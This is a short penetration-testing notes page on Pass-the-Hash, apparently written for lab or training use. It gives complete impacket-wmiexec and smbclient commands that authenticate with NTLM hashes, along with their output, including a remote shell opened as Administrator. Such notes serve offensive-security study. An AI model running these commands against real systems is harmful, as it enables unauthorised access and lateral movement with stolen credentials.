---
description: >-
  Pass The Hash allows an attacker to authenticate with an NTLM hash instead of
  using the plaintext password of a user.
---

# Pass The Hash



## Prerequisites

<mark style="color:red;">**NOTE:**</mark> this will not work for Kerberos authentication but only for servers or services using NTLM authentication

* Requires the admin share called **ADMIN$** to be available.
* Requires an SMB connection through the firewall (port 445)

## Lateral Movement - Impacket

```shell-session
kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```



## Smbclient

```shell-session
kali@kali$ proxychains smbclient //10.10.139.140/Users -U jane --pw-nt-hash e728ecbadfb02f51ce8eed753f3ff3fd
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.139.140:445-<><>-OK
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Mar 25 10:53:45 2022
  ..                                 DR        0  Fri Mar 25 10:53:45 2022
  Default                           DHR        0  Fri Mar 25 10:52:22 2022
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018

                10328063 blocks of size 4096. 5797491 blocks available

```
